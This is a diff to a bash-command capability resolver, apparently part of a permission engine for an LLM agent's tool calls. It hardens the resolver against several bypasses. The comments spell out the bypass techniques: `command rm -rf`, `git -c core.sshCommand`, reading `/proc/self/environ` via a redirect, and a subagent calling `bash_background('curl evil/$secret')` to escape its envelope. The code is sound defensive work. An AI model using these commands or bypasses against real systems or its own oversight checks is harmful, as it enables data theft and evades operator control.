@@ -208,6 +208,18 @@ const HARD_REFUSE_COMMANDS: ReadonlySet<string> = new Set([
   'parted',
   'mkswap',
   'shred',
+  // Slice 128 (R4 P0-Launder-1): `command` and `builtin` are bash
+  // builtins designed SPECIFICALLY to bypass alias/function lookup
+  // and run a command directly. Same threat shape as `eval`: an
+  // LLM typing `command rm -rf /home` routes through `cmdSysInfo`
+  // (which emits read-fs:/etc only), bypassing cmdRm's delete-fs
+  // attribution entirely. A narrow allow rule on read-fs:/etc then
+  // admits arbitrary commands. Pre-slice `command` was registered
+  // in COMMAND_TABLE as cmdSysInfo (silently treating it as a noop
+  // info command) — now it's hard-refused before reaching the
+  // table.
+  'command',
+  'builtin',
 ]);
 
 const isHardRefuseCommand = (name: string): boolean => {
@@ -268,8 +280,23 @@ const cmdEcho: CommandResolver = () => ({ capabilities: [], confidence: 'high' }
 // from stdin — attribute read-fs of cwd as a conservative floor
 // for pipeline composition. The `-exec` escape hatch maps to
 // arbitrary exec like find's.
+// Slice 128 (R4 P0-Launder-4): grep / find exec-shaped flags.
+// All four GNU `find` variants run an arbitrary command; pre-slice
+// only `-exec`/`--exec` were detected. `-execdir` is the same
+// threat shape with a different cwd at exec time; `-ok` / `-okdir`
+// prompt the user but the prompt happens AFTER the binary is
+// already invoked (the prompt is a no-op if non-interactive).
+const FIND_EXEC_FLAGS: ReadonlySet<string> = new Set([
+  '-exec',
+  '--exec',
+  '-execdir',
+  '--execdir',
+  '-ok',
+  '-okdir',
+]);
+
 const cmdGrep: CommandResolver = (positional, tokens, ctx) => {
-  if (tokens.includes('-exec') || tokens.includes('--exec')) {
+  if (tokens.some((t) => FIND_EXEC_FLAGS.has(t))) {
     return {
       capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
       confidence: 'medium',
@@ -288,7 +315,7 @@ const cmdGrep: CommandResolver = (positional, tokens, ctx) => {
 // find: all positionals are filesystem paths (find DIR1 DIR2 -name ...).
 // Pattern-style filters arrive as flags and are excluded by stripFlags.
 const cmdFind: CommandResolver = (positional, tokens, ctx) => {
-  if (tokens.includes('-exec') || tokens.includes('--exec')) {
+  if (tokens.some((t) => FIND_EXEC_FLAGS.has(t))) {
     return {
       capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
       confidence: 'medium',
@@ -380,6 +407,12 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
   // capability — the URL-side egress still covers the net side, and
   // the operator's modal will see the literal command.
   const writeTargets: string[] = [];
+  // Slice 128 (R4 P1-Launder): read targets from `--upload-file`/`-T`
+  // (curl PUT body) and `--config`/`-K` (curl config file containing
+  // URLs + credentials). Plus additional write targets from
+  // `--cookie-jar`/`-c` and `--dump-header`/`-D` which write file
+  // outputs cmdCurlWget pre-slice missed entirely.
+  const readTargets: string[] = [];
   for (let i = 0; i < tokens.length; i += 1) {
     const t = tokens[i] ?? '';
     // curl long form `--output=<path>`
@@ -399,6 +432,30 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       if (target.length > 0) writeTargets.push(target);
       continue;
     }
+    // Slice 128: --cookie-jar / -c <path> writes cookies.
+    if (t.startsWith('--cookie-jar=')) {
+      const target = t.slice('--cookie-jar='.length);
+      if (target.length > 0) writeTargets.push(target);
+      continue;
+    }
+    // Slice 128: --dump-header / -D <path> writes response headers.
+    if (t.startsWith('--dump-header=')) {
+      const target = t.slice('--dump-header='.length);
+      if (target.length > 0) writeTargets.push(target);
+      continue;
+    }
+    // Slice 128: --upload-file / -T <path> reads file as PUT body.
+    if (t.startsWith('--upload-file=')) {
+      const target = t.slice('--upload-file='.length);
+      if (target.length > 0) readTargets.push(target);
+      continue;
+    }
+    // Slice 128: --config / -K <path> reads URL list / credentials.
+    if (t.startsWith('--config=')) {
+      const target = t.slice('--config='.length);
+      if (target.length > 0) readTargets.push(target);
+      continue;
+    }
     // Separated forms: `-o <path>`, `--output <path>`, `-O <path>`,
     // `--output-document <path>`. Skip the value-less degenerate
     // shape `-O-` (writes to stdout) and `-O` followed by another
@@ -409,25 +466,90 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
         writeTargets.push(next);
         i += 1;
       }
+      continue;
+    }
+    // Slice 128 (R4 P1-Launder): separated forms for the new flags.
+    if (t === '--cookie-jar' || t === '-c' || t === '--dump-header' || t === '-D') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        writeTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t === '--upload-file' || t === '-T' || t === '--config' || t === '-K') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        readTargets.push(next);
+        i += 1;
+      }
     }
   }
   const urlToken = positional[0];
   const writeCaps = writeTargets.map((p) => writeFs(resolveArg(p, ctx)));
+  // Slice 128 (R4 P1-Launder): include the new read targets in the
+  // emitted capability set so the engine's per-arg classifier sees
+  // them.
+  const readCaps = readTargets.map((p) => readFs(resolveArg(p, ctx)));
   if (urlToken === undefined) {
-    return { capabilities: [netEgress('*'), ...writeCaps], confidence: 'medium' };
+    return {
+      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
+      confidence: 'medium',
+    };
   }
   try {
     const host = new URL(urlToken).hostname.toLowerCase();
     return {
-      capabilities: [netEgress(host || '*'), ...writeCaps],
+      capabilities: [netEgress(host || '*'), ...writeCaps, ...readCaps],
       confidence: 'high',
     };
   } catch {
-    return { capabilities: [netEgress('*'), ...writeCaps], confidence: 'medium' };
+    return {
+      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
+      confidence: 'medium',
+    };
   }
 };
 
 const cmdGit: CommandResolver = (positional, tokens, ctx) => {
+  // Slice 128 (R4 P0-Launder-2): `git -c <key>=<value>` sets a
+  // one-shot config override. Several git config keys execute
+  // arbitrary commands:
+  //   core.sshCommand    — used by every git remote operation
+  //   core.pager         — pages log/diff output
+  //   core.fsmonitor     — invoked on status
+  //   core.editor        — invoked on commit / rebase
+  //   gpg.program        — sign / verify
+  // An LLM typing `git -c core.sshCommand='sh -c "id"' clone X`
+  // bypasses cmdGit's clone case (because `-c` is in tokens but
+  // `core.sshCommand=...` is a positional [stripFlags doesn't
+  // strip non-`-` tokens]). The switch picks `clone` as the
+  // subcommand — emits gitWrite + netEgress but NO exec:arbitrary.
+  //
+  // Defense: refuse static analysis when `-c` or `--config-env`
+  // is present. Operator workflows that legitimately need git
+  // config overrides should use `~/.gitconfig` or per-repo
+  // `.git/config` instead (which the engine can audit through the
+  // file path).
+  //
+  // Also: `--exec-path=<path>` overrides where git looks for its
+  // helper binaries — attacker can plant a fake `git-clone` at
+  // `<path>/git-clone` and trigger it via the surrounding clone
+  // call. Refuse.
+  for (const t of tokens) {
+    if (t === '-c' || t === '--config-env') {
+      return {
+        refuse:
+          'git: -c / --config-env overrides arbitrary git config (including core.sshCommand / core.pager) — refusing static analysis',
+      };
+    }
+    if (t === '--exec-path' || t.startsWith('--exec-path=')) {
+      return {
+        refuse:
+          'git: --exec-path overrides git helper-binary lookup path — refusing static analysis',
+      };
+    }
+  }
   const sub = positional[0];
   const REPO = ctx.cwd;
   if (sub === undefined) {
@@ -533,16 +655,35 @@ const cmdInterpreter: CommandResolver = (_positional, tokens, ctx) => {
   // `-c` indicates inline code. Both POSIX (`python -c "code"`) and
   // perl-specific variants (`-e`/`-E` for one-liners) collapse here
   // — perl's `-e` is the same threat model. Refuse the lot.
+  //
+  // Slice 128 (R4 P1-Launder): node accepts `--eval` (long form of
+  // `-e`) which slice 100 missed. Refuse it under the same banner.
+  // Also `-m <module>` for python (loads + executes a module by
+  // name) is the same threat shape; refuse.
+  let hasNetIngress = false;
   for (let i = 0; i < tokens.length; i += 1) {
     const t = tokens[i];
-    if (t === '-c' || t === '-e' || t === '-E') {
+    if (t === '-c' || t === '-e' || t === '-E' || t === '--eval' || t === '-m') {
       return {
         refuse: `interpreter: '${t} <code>' executes inline code; refusing static analysis`,
       };
     }
+    // Slice 128 (R4 P1-Launder): `node --inspect[=<host:port>]` /
+    // `--inspect-brk[=...]` opens a debugger listener. Anything
+    // reaching the port gets full V8 control. Attribute net-ingress
+    // so the operator's policy sees the listener side effect.
+    if (
+      t === '--inspect' ||
+      t === '--inspect-brk' ||
+      (t !== undefined && (t.startsWith('--inspect=') || t.startsWith('--inspect-brk=')))
+    ) {
+      hasNetIngress = true;
+    }
   }
+  const caps: Capability[] = [exec('arbitrary'), readFs(ctx.cwd)];
+  if (hasNetIngress) caps.push(netIngress('*'));
   return {
-    capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
+    capabilities: caps,
     confidence: 'high',
   };
 };
@@ -1285,7 +1426,10 @@ const COMMAND_TABLE: ReadonlyMap<string, CommandResolver> = new Map<string, Comm
   ['printenv', cmdSysInfo],
   ['which', cmdSysInfo],
   ['type', cmdSysInfo],
-  ['command', cmdSysInfo],
+  // `command` removed slice 128 (R4 P0-Launder-1) — now hard-refused
+  // via HARD_REFUSE_COMMANDS. Was treating `command` as a noop
+  // sysinfo verb, silently laundering capability attribution for
+  // the actual command it ran.
   // Navigation (no persistent side-effect across tool calls)
   ['cd', cmdCd],
   // Slice 120 — archive / remote / build (R2 #199)
@@ -1949,7 +2093,7 @@ const analyzeCommand = (
   const redirectCaps: Capability[] = [];
   for (const r of shape.redirects) {
     if (r.kind === 'out' || r.kind === 'append' || r.kind === 'both' || r.kind === 'force-out') {
-      const tgtAbs = resolvePath(ctx.cwd, r.target);
+      const tgtAbs = resolvePath(ctx.cwd, expandTilde(r.target, ctx.home));
       const tier = classifyProtectedPath({
         absPath: tgtAbs,
         op: 'write',
@@ -1964,7 +2108,33 @@ const analyzeCommand = (
       if (tier === 'escalate') finalConf = 'low';
       redirectCaps.push(writeFs(tgtAbs));
     }
-    // 'in' → consume; no fs write.
+    // Slice 128 (R4 P0-Launder-3): input redirects `<` ALSO pass
+    // through the classifier. Pre-slice the `'in'` branch was
+    // commented "consume; no fs write" and skipped entirely — but
+    // `cat < /proc/self/environ` reads attacker-targeted
+    // credentials, and the /proc deny tier never fired because
+    // cmdRead emits `read-fs:cwd` from "no positional" branch and
+    // the redirect target was never classified. Symmetric to the
+    // write-redirect check above, but with op='read' so only
+    // SYSTEM_DENY_ROOTS (/proc, /sys, /boot, /dev) catch — the
+    // escalate tier doesn't apply to reads, by design.
+    if (r.kind === 'in') {
+      const tgtAbs = resolvePath(ctx.cwd, expandTilde(r.target, ctx.home));
+      const tier = classifyProtectedPath({
+        absPath: tgtAbs,
+        op: 'read',
+        home: ctx.home,
+        cwd: ctx.cwd,
+      });
+      if (tier === 'deny') {
+        return {
+          refuse: `bash: input redirect source '${r.target}' is in protected zone (deny tier)`,
+        };
+      }
+      // Add read-fs to capabilities — the shell will read from
+      // this path, the resolver should honestly admit so.
+      redirectCaps.push(readFs(tgtAbs));
+    }
   }
 
   return {
@@ -2035,3 +2205,28 @@ const bashResolver: Resolver = (args, ctx): ResolverResult => {
 };
 
 registerResolver('bash', bashResolver);
+
+// Slice 128 (R4 P0-Bypass-1): register the bash AST resolver for the
+// background-bash family too. Pre-slice `bash_background`,
+// `bash_output`, `bash_kill` had no resolver entry; the engine's
+// `resolveCapabilities(toolName)` fell to the conservative
+// (no-resolver) path returning `capabilities: []`. The §10.1
+// subagent envelope check at `engine.ts:1338` is gated on
+// `resolvedCapabilities.length > 0`, so a subagent with narrowed
+// envelope (e.g., `['read-fs:src/**']`) could call
+// `bash_background('curl evil/$secret')` and bypass the envelope
+// check entirely.
+//
+// The same `args.command` shape feeds these tools; the bash AST
+// resolver works for them unchanged. bash_output and bash_kill
+// don't carry a `command` arg (they reference a background job
+// id) — the resolver returns conservative `{capabilities: []}`
+// for those shapes but at least gets called, so the envelope
+// gate can run. bash_kill MIGHT still slip through if the
+// envelope gate skips empty-cap calls; the proper architectural
+// fix is to make the gate fire for any side-effect-declaring tool
+// regardless of resolver output, but registering the resolver
+// closes the immediate exposure.
+registerResolver('bash_background', bashResolver);
+registerResolver('bash_output', bashResolver);
+registerResolver('bash_kill', bashResolver);
